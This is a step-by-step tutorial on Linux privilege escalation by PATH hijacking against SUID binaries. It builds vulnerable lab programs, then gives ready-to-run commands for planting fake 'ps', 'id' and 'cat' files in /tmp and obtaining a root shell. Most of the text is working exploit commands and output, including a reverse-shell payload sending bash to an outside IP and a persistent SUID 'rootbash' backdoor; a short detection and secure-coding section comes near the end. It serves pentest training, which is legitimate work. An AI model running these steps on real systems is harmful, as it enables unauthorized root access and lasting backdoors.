# Path Manipulation



### Overview

**PATH Variable Privilege Escalation** exploits misconfigurations in how applications reference system binaries. When programs with SUID permissions call system commands without using absolute paths (e.g., calling `ps` instead of `/bin/ps`), an attacker can manipulate the PATH environment variable to hijack these calls and execute arbitrary code with elevated privileges.

This vulnerability occurs when developers fail to specify full paths to executables in their programs, allowing the system to search for binaries in directories controlled by the attacker. By placing a malicious file with the same name as the legitimate binary in a directory that appears earlier in the PATH, the attacker's code executes instead of the intended system binary—with SUID root privileges if the vulnerable program has the SUID bit set.

**Key Concepts:**

* **PATH Environment Variable** - Lists directories where the shell searches for executable files
* **SUID (Set User ID)** - Permission bit causing files to execute with owner's privileges
* **Relative vs Absolute Paths** - Relative paths (e.g., `ps`) are vulnerable; absolute paths (e.g., `/bin/ps`) are safe
* **PATH Hijacking** - Prepending malicious directories to PATH to intercept binary calls
* **Command Interception** - Replacing legitimate commands with malicious versions

**Why This Works:**

* Programs call system commands without full paths (e.g., `system("ps")`)
* Shell searches PATH directories in order from left to right
* First matching executable found is executed
* SUID programs execute with owner's privileges (often root)
* Attacker-controlled directories can be placed first in PATH

**Common Vulnerable Patterns:**

```c
system("ps");           // Vulnerable - relative path
system("/bin/ps");      // Safe - absolute path

system("id");           // Vulnerable
system("/usr/bin/id");  // Safe

system("cat file");     // Vulnerable
system("/bin/cat file"); // Safe
```

**Exploitation Requirements:**

* SUID binary that calls system commands with relative paths
* Ability to modify PATH environment variable
* Write access to a directory (typically /tmp)
* Ability to execute the vulnerable SUID binary

***

### Exploitation Workflow Summary

1. Enumeration Phase ├─ Find SUID binaries on the system ├─ Execute SUID binaries to observe behavior ├─ Identify which system commands are called └─ Determine if relative paths are used
2. Vulnerability Analysis ├─ Test if binary uses relative paths ├─ Identify called commands (ps, id, cat, etc.) ├─ Verify SUID bit is set and owned by root └─ Confirm ability to modify PATH
3. Payload Creation ├─ Create malicious binary with same name as target command ├─ Place in attacker-controlled directory (/tmp) ├─ Make executable (chmod 777) └─ Test payload functionality
4. PATH Manipulation ├─ Export modified PATH with attacker directory first ├─ Verify PATH modification successful ├─ Ensure malicious binary found before legitimate one └─ Document original PATH for restoration if needed
5. Privilege Escalation ├─ Execute vulnerable SUID binary ├─ Malicious binary runs with SUID privileges ├─ Obtain root shell └─ Verify root access with whoami/id

***

### Phase 1: Understanding PATH Variable

#### What is the PATH Variable?

**The PATH environment variable** specifies directories where the shell searches for executable files. When you type a command, the shell searches these directories in order from left to right until it finds a matching executable.

**View your current PATH:**

```bash
echo $PATH
```

**Expected output:**

```
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

**PATH structure explained:**

* Directories separated by colons (`:`)
* Searched from left to right
* First match wins
* Common directories: `/usr/local/bin`, `/usr/bin`, `/bin`, `/sbin`, `/usr/sbin`

**Example of how PATH works:**

```bash
# When you type 'ls', the shell searches:
# 1. /usr/local/bin/ls  (not found)
# 2. /usr/bin/ls        (not found)
# 3. /bin/ls            (found! - executes this)
```

**Dangerous PATH configurations:**

**PATH with current directory (.):**

```bash
echo $PATH
```

**Vulnerable output:**

```
.:/usr/local/bin:/usr/bin:/bin
```

**Why this is dangerous:** The dot (`.`) means "current directory". If you're in an attacker-controlled directory, malicious binaries there will execute first.

**PATH with writable directories:**

```bash
# If /tmp or other writable directories are in PATH
/tmp:/usr/local/bin:/usr/bin:/bin
```

**Why this is dangerous:** Attacker can place malicious binaries in `/tmp` which will be found before legitimate ones.

#### How Programs Use PATH

**When a program calls a system command:**

**Safe method (absolute path):**

```c
#include <stdlib.h>

int main() {
    system("/bin/ps");  // Safe - exact path specified
    return 0;
}
```

**Vulnerable method (relative path):**

```c
#include <stdlib.h>

int main() {
    system("ps");  // Vulnerable - shell searches PATH
    return 0;
}
```

**Why the difference matters:**

* Absolute path: Only executes `/bin/ps`, no PATH search
* Relative path: Searches PATH directories, can be hijacked

***

### Phase 2: Enumeration and Discovery

#### Finding SUID Binaries

**Search for SUID files:**

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Parameters explained:**

* `/` - Search from root directory
* `-perm -u=s` - Find files with SUID bit set
* `-type f` - Only files, not directories
* `2>/dev/null` - Suppress permission denied errors

**Expected output:**

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/home/raj/script/shell
/home/raj/script/shell2
/home/raj/script/raj
/home/raj/script/ignite
```

**Focus on unusual SUID binaries:**

* Standard binaries: `/usr/bin/passwd`, `/usr/bin/sudo` (expected)
* Custom binaries: `/home/raj/script/shell` (suspicious!)
* Anything in user directories is worth investigating

**Alternative SUID search:**

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Detailed SUID listing:**

```bash
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
```

**Expected output:**

```
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 146128 Nov 29  2018 /usr/bin/sudo
-rwsr-xr-x 1 root root 16824 Aug 15 14:30 /home/raj/script/shell
```

#### Testing SUID Binaries

**Navigate to suspicious binary:**

```bash
cd /home/raj/script/
ls -la
```

**Expected output:**

```
-rwsr-xr-x 1 root root 16824 Aug 15 14:30 shell
-rwsr-xr-x 1 root root 16856 Aug 15 15:00 shell2
-rwsr-xr-x 1 root root 16904 Aug 15 15:30 raj
```

**Execute the binary to observe behavior:**

```bash
./shell
```

**Expected output:**

```
  PID TTY          TIME CMD
 1234 pts/0    00:00:00 bash
 5678 pts/0    00:00:00 shell
 5679 pts/0    00:00:00 ps
```

**Key observation:** The output looks like the `ps` command. This means the binary is calling `ps` internally.

**Test another binary:**

```bash
./shell2
```

**Expected output:**

```
uid=1000(raj) gid=1000(raj) groups=1000(raj)
```

**Key observation:** This output matches the `id` command format, indicating the binary calls `id` internally.

**Test third binary:**

```bash
./raj
```

**Expected output:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Key observation:** This displays `/etc/passwd` contents, indicating it calls `cat /etc/passwd`.

#### Identifying Called Commands

**Use strings command to analyze binary:**

```bash
strings /home/raj/script/shell
```

**Expected output:**

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__libc_start_main
GLIBC_2.2.5
ps
...
```

**Key finding:** The string "ps" appears, confirming the binary calls the `ps` command.

**Use ltrace to trace library calls:**

```bash
ltrace ./shell
```

**Expected output:**

```
__libc_start_main(0x40052d, 1, 0x7fffffffe588, 0x400560
system("ps"
  PID TTY          TIME CMD
 1234 pts/0    00:00:00 bash
 5678 pts/0    00:00:00 shell
 5679 pts/0    00:00:00 ps
```

**Key finding:** Shows `system("ps")` call, confirming relative path usage.

**Use strace to trace system calls:**

```bash
strace ./shell 2>&1 | grep execve
```

**Expected output:**

```
execve("./shell", ["./shell"], 0x7fffffffe598) = 0
execve("/bin/sh", ["sh", "-c", "ps"], 0x7fffffffe4c8) = 0
execve("/usr/local/bin/ps", ["ps"], 0x7fffffffe598) = -1 ENOENT
execve("/usr/bin/ps", ["ps"], 0x7fffffffe598) = 0
```

**Key finding:** Shows the shell searching PATH directories for `ps`.

***

### Phase 3: Method 1 - Exploiting Binary Calling 'ps'

#### Lab Setup (For Testing)

**Create vulnerable program:**

```bash
pwd
mkdir script
cd script
nano demo.c
```

**demo.c contents:**

```c
#include <stdlib.h>

int main() {
    system("ps");
    return 0;
}
```

**Why this is vulnerable:** Using `system("ps")` without full path `/bin/ps`.

**Compile and set SUID:**

```bash
gcc demo.c -o shell
chmod u+s shell
ls -la shell
```

**Expected output:**

```
-rwsr-xr-x 1 root root 16824 Dec 20 10:00 shell
```

**Verify SUID bit:** The `s` in `-rwsr-xr-x` means SUID is set.

#### Technique 1: Echo Command

**Create malicious 'ps' binary:**

```bash
cd /tmp
echo "/bin/bash" > ps
chmod 777 ps
ls -la ps
```

**Expected output:**

```
-rwxrwxrwx 1 raj raj 10 Dec 20 10:05 ps
```

**What this does:** Creates a file named `ps` that, when executed, runs `/bin/bash`.

**View current PATH:**

```bash
echo $PATH
```

**Expected output:**

```
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

**Modify PATH to include /tmp first:**

```bash
export PATH=/tmp:$PATH
echo $PATH
```

**Expected output:**

```
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

**Why this works:** Now `/tmp` is searched first. When the SUID binary calls `ps`, it finds `/tmp/ps` before `/bin/ps`.

**Execute vulnerable SUID binary:**

```bash
cd /home/raj/script
./shell
```

**Expected result:**

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Why you got root:**

1. `./shell` (SUID root) executes
2. Calls `system("ps")`
3. Shell searches PATH from left to right
4. Finds `/tmp/ps` first
5. Executes `/tmp/ps` (which is `/bin/bash`)
6. Bash inherits SUID root privilege
7. You get a root shell

#### Technique 2: Copy Command

**Create malicious 'ps' by copying shell:**

```bash
cd /tmp
cp /bin/sh /tmp/ps
chmod 777 ps
ls -la ps
```

**Expected output:**

```
-rwxrwxrwx 1 raj raj 125688 Dec 20 10:10 ps
```

**Why copy /bin/sh:** Creates a full shell binary, not just a script. More reliable than echo method.

**Modify PATH:**

```bash
export PATH=/tmp:$PATH
```

**Execute vulnerable binary:**

```bash
cd /home/raj/script
./shell
```

**Expected result:**

```bash
# whoami
root
# id
uid=0(root) gid=1000(raj) egid=0(root) groups=0(root),1000(raj)
```

**Note the effective UID (euid):** Shows 0 (root), confirming SUID privilege escalation worked.

#### Technique 3: Symbolic Link

**Create symbolic link:**

```bash
cd /home/raj/script
ln -s /bin/sh ps
ls -la ps
```

**Expected output:**

```
lrwxrwxrwx 1 raj raj 7 Dec 20 10:15 ps -> /bin/sh
```

**Parameters explained:**

* `ln -s` - Create symbolic link
* `/bin/sh` - Target (what to link to)
* `ps` - Link name

**Modify PATH to include current directory first:**

```bash
export PATH=.:$PATH
echo $PATH
```

**Expected output:**

```
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

**Why use current directory:** The symlink `ps` is in the current directory, so we need `.` (current directory) in PATH.

**Execute vulnerable binary:**

```bash
./shell
```

**Expected result:**

```bash
# id
uid=0(root) gid=1000(raj) egid=0(root) groups=0(root),1000(raj)
# whoami
root
```

**Important note about symlinks:** This technique requires the directory to have appropriate permissions. The symlink itself doesn't need special permissions, but the directory should allow execution.

**Why symlink works:**

1. `./shell` calls `system("ps")`
2. Shell searches PATH, finds `./ps` (in current directory)
3. `ps` is a symlink pointing to `/bin/sh`
4. Executes `/bin/sh` with SUID root privileges
5. Root shell spawned

***

### Phase 4: Method 2 - Exploiting Binary Calling 'id'

#### Lab Setup

**Create vulnerable program:**

```bash
cd /home/raj/script
nano test.c
```

**test.c contents:**

```c
#include <stdlib.h>

int main() {
    system("id");
    return 0;
}
```

**Compile and set SUID:**

```bash
gcc test.c -o shell2
chmod u+s shell2
ls -la shell2
```

**Expected output:**

```
-rwsr-xr-x 1 root root 16856 Dec 20 10:20 shell2
```

#### Exploitation

**Find SUID binary:**

```bash
find / -perm -u=s -type f 2>/dev/null | grep shell2
```

**Expected output:**

```
/home/raj/script/shell2
```

**Test binary behavior:**

```bash
cd /home/raj/script/
./shell2
```

**Expected output:**

```
uid=1000(raj) gid=1000(raj) groups=1000(raj)
```

**Observation:** Calls the `id` command to display user information.

**Create malicious 'id' binary:**

```bash
cd /tmp
echo "/bin/bash" > id
chmod 777 id
```

**Modify PATH:**

```bash
export PATH=/tmp:$PATH
echo $PATH
```

**Expected output:**

```
/tmp:/usr/local/bin:/usr/bin:/bin
```

**Execute vulnerable binary:**

```bash
cd /home/raj/script
./shell2
```

**Expected result:**

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Why this worked:** Same principle as Method 1, but hijacking `id` instead of `ps`.

***

### Phase 5: Method 3 - Exploiting Binary Calling 'cat'

#### Lab Setup

**Create vulnerable program:**

```bash
cd /home/raj/script
nano raj.c
```

**raj.c contents:**

```c
#include <stdlib.h>

int main() {
    system("cat /etc/passwd");
    return 0;
}
```

**Compile and set SUID:**

```bash
gcc raj.c -o raj
chmod u+s raj
ls -la raj
```

**Expected output:**

```
-rwsr-xr-x 1 root root 16904 Dec 20 10:30 raj
```

#### Exploitation

**Find and test binary:**

```bash
find / -perm -u=s -type f 2>/dev/null | grep raj
```

**Expected output:**

```
/home/raj/script/raj
```

**Test binary:**

```bash
cd /home/raj/script/
./raj
```

**Expected output:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Observation:** Displays `/etc/passwd` contents by calling `cat /etc/passwd`.

#### Technique 4: Using Nano Editor

**Create malicious 'cat' using nano:**

```bash
cd /tmp
nano cat
```

**In nano editor, type:**

```bash
/bin/bash
```

**Save and exit:** Press `Ctrl+X`, then `Y`, then `Enter`.

**Make executable:**

```bash
chmod 777 cat
ls -la cat
```

**Expected output:**

```
-rwxrwxrwx 1 raj raj 10 Dec 20 10:35 cat
```

**Verify file contents:**

```bash
cat cat
```

**Expected output:**

```
/bin/bash
```

**Modify PATH:**

```bash
export PATH=/tmp:$PATH
echo $PATH
```

**Expected output:**

```
/tmp:/usr/local/bin:/usr/bin:/bin
```

**Execute vulnerable binary:**

```bash
cd /home/raj/script
./raj
```

**Expected result:**

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

***

### Phase 6: Method 4 - Exploiting Binary with File Not Found Error

#### Lab Setup

**Create vulnerable program:**

```bash
cd /home/raj/script
nano demo.c
```

**demo.c contents:**

```c
#include <stdlib.h>

int main() {
    system("cat /home/raj/msg.txt");
    return 0;
}
```

**Note:** The file `/home/raj/msg.txt` doesn't exist, causing an error.

**Compile and set SUID:**

```bash
gcc demo.c -o ignite
chmod u+s ignite
ls -la ignite
```

**Expected output:**

```
-rwsr-xr-x 1 root root 16920 Dec 20 10:40 ignite
```

#### Exploitation

**Find and test binary:**

```bash
find / -perm -u=s -type f 2>/dev/null | grep ignite
```

**Expected output:**

```
/home/raj/script/ignite
```

**Test binary:**

```bash
cd /home/raj/script/
./ignite
```

**Expected output:**

```
cat: /home/raj/msg.txt: No such file or directory
```

**Observation:** The binary tries to use `cat` to read a non-existent file. We can still hijack the `cat` command.

#### Technique 5: Using Vi Editor

**Create malicious 'cat' using vi:**

```bash
cd /tmp
vi cat
```

**In vi editor:**

1. Press `i` for insert mode
2. Type: `/bin/bash`
3. Press `Esc`
4. Type: `:wq` and press `Enter`

**Make executable:**

```bash
chmod 777 cat
ls -la cat
```

**Expected output:**

```
-rwxrwxrwx 1 raj raj 10 Dec 20 10:45 cat
```

**Modify PATH:**

```bash
export PATH=/tmp:$PATH
echo $PATH
```

**Expected output:**

```
/tmp:/usr/local/bin:/usr/bin:/bin
```

**Execute vulnerable binary:**

```bash
cd /home/raj/script
./ignite
```

**Expected result:**

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Why this worked even with the error:** The binary still calls `cat`, which is hijacked. The error message never displays because our malicious `cat` spawns a shell instead.

***

### Advanced Exploitation Techniques

#### Creating More Sophisticated Payloads

**Reverse shell payload:**

```bash
cd /tmp
cat << 'EOF' > ps
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
EOF
chmod 777 ps
```

**On attacker machine:**

```bash
nc -lvnp 4444
```

**Execute vulnerable SUID binary, receive root shell:**

```
Listening on 0.0.0.0 4444
Connection received on 10.10.10.10 49832
bash: no job control in this shell
root@target:~# whoami
root
```

**SUID bash creation:**

```bash
cd /tmp
cat << 'EOF' > id
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
/usr/bin/id
EOF
chmod 777 id
export PATH=/tmp:$PATH
cd /home/raj/script
./shell2
```

**After execution:**

```bash
ls -la /tmp/rootbash
```

**Expected output:**

```
-rwsr-xr-x 1 root root 1183448 Dec 20 10:50 /tmp/rootbash
```

**Use SUID bash:**

```bash
/tmp/rootbash -p
```

**Expected result:**

```
rootbash-5.0# whoami
root
```

**Why `-p` flag:** Preserves SUID privileges when running bash.

#### Multi-Command Hijacking

**If binary calls multiple commands:**

```c
system("ps");
system("id");
system("whoami");
```

**Create all three:**

```bash
cd /tmp
echo "/bin/bash" > ps
echo "/bin/bash" > id
echo "/bin/bash" > whoami
chmod 777 ps id whoami
export PATH=/tmp:$PATH
```

**First command to be called will spawn root shell.**

***

### Detection and Prevention

#### For System Administrators

**Finding vulnerable SUID binaries:**

```bash
# Check for SUID binaries calling system commands
for file in $(find / -perm -u=s -type f 2>/dev/null); do
    strings "$file" | grep -E "system|exec" && echo "Potential vulnerability: $file"
done
```

**Audit custom SUID binaries:**

```bash
# List non-standard SUID files
find / -perm -u=s -type f 2>/dev/null | grep -v "^/usr/bin\|^/bin\|^/sbin"
```

**Check PATH configuration:**

```bash
# Verify PATH doesn't include current directory or /tmp
echo $PATH | grep -E "^\.|/tmp"
```

#### Secure Coding Practices

**Bad practice:**

```c
system("ps");           // Never do this
system("id");
system("cat file");
```

**Good practice:**

```c
system("/bin/ps");      // Always use absolute paths
system("/usr/bin/id");
system("/bin/cat /path/to/file");
```

**Even better practice:**

```c
// Use execve() instead of system()
char *args[] = {"/bin/ps", NULL};
execve("/bin/ps", args, NULL);
```

**Why execve is better:** Doesn't invoke a shell, eliminating PATH-based attacks entirely.

***

### Troubleshooting

#### PATH Modification Not Working

**Problem:** Modified PATH but vulnerable binary still uses original binary

**Solution:**

```bash
# Verify PATH modification
echo $PATH

# Should show /tmp first:
# /tmp:/usr/local/bin:/usr/bin:/bin

# If not, re-export
export PATH=/tmp:$PATH

# Verify malicious binary is found first
which ps
# Should output: /tmp/ps

# If not, check permissions
ls -la /tmp/ps
chmod 777 /tmp/ps
```

**Why it works:** Ensures your malicious binary is found before the legitimate one.

#### SUID Binary Not Providing Root Shell

**Problem:** Execute vulnerable SUID binary but don't get root shell

**Solution:**

```bash
# Check if binary actually has SUID bit
ls -la /home/raj/script/shell
# Should show: -rwsr-xr-x (note the 's')

# Verify binary is owned by root
# Should show: root root

# Check if binary actually calls relative path
strings /home/raj/script/shell | grep -E "ps|id|cat"

# Try using /bin/bash instead of /bin/sh
echo "/bin/bash" > /tmp/ps

# Use bash with -p flag for SUID preservation
echo "/bin/bash -p" > /tmp/ps
```

**Why it works:** Some shells drop SUID privileges; bash with `-p` preserves them.

#### Malicious Binary Not Executing

**Problem:** Created malicious binary but it doesn't execute

**Solution:**

```bash
# Check if file is actually executable
ls -la /tmp/ps
# Should show: -rwxrwxrwx

# Make it executable
chmod +x /tmp/ps

# Verify file contents
cat /tmp/ps
# Should contain: /bin/bash or similar

# Check file format (for copied binaries)
file /tmp/ps

# For script files, add shebang
echo '#!/bin/bash' > /tmp/ps
echo '/bin/bash' >> /tmp/ps
chmod 777 /tmp/ps
```

**Why it works:** Files must be executable and properly formatted to run.

#### Getting 'sh' Instead of 'bash'

**Problem:** Got a shell but limited functionality (sh instead of bash)

**Solution:**

```bash
# Upgrade to full bash
/bin/bash -i

# Or create payload that spawns bash directly
echo "/bin/bash -i" > /tmp/ps

# For TTY shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Or
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Why it works:** Spawns a full interactive bash shell with all features.

#### Root Shell Exits Immediately

**Problem:** Get root shell but it closes instantly

**Solution:**

```bash
# Create interactive shell payload
cat << 'EOF' > /tmp/ps
#!/bin/bash
exec /bin/bash -i
EOF
chmod 777 /tmp/ps

# Or use read to keep shell open
cat << 'EOF' > /tmp/ps
#!/bin/bash
/bin/bash
read -p "Press enter to continue"
EOF
chmod 777 /tmp/ps

# Or spawn SUID bash for persistence
cat << 'EOF' > /tmp/ps
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
/tmp/rootbash -p
EOF
chmod 777 /tmp/ps
```

**Why it works:** Ensures shell remains interactive and doesn't exit after spawning.

***

### Quick Reference

#### Basic Exploitation Steps

```bash
# 1. Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# 2. Test binary to identify called command
./suspicious_binary

# 3. Create malicious version
cd /tmp
echo "/bin/bash" > command_name
chmod 777 command_name

# 4. Modify PATH
export PATH=/tmp:$PATH

# 5. Execute vulnerable binary
./suspicious_binary
whoami
```

#### Quick Payload Creation

```bash
# Echo method
echo "/bin/bash" > /tmp/ps && chmod 777 /tmp/ps

# Copy method
cp /bin/sh /tmp/ps && chmod 777 /tmp/ps

# Symlink method
ln -s /bin/sh ps

# With bash -p for SUID preservation
echo "/bin/bash -p" > /tmp/ps && chmod 777 /tmp/ps
```

#### PATH Manipulation

```bash
# Add /tmp to beginning of PATH
export PATH=/tmp:$PATH

# Add current directory to PATH
export PATH=.:$PATH

# View current PATH
echo $PATH

# Verify which binary will be used
which ps
```

#### Verification Commands

```bash
# Check SUID binaries
ls -la suspicious_binary
# Should show: -rwsr-xr-x 1 root root ...

# Verify PATH
echo $PATH
# Should show your directory first

# Check which binary will execute
which command_name
# Should show your malicious binary path

# Verify root access after exploitation
whoami  # Should output: root
id      # Should show uid=0(root)
```
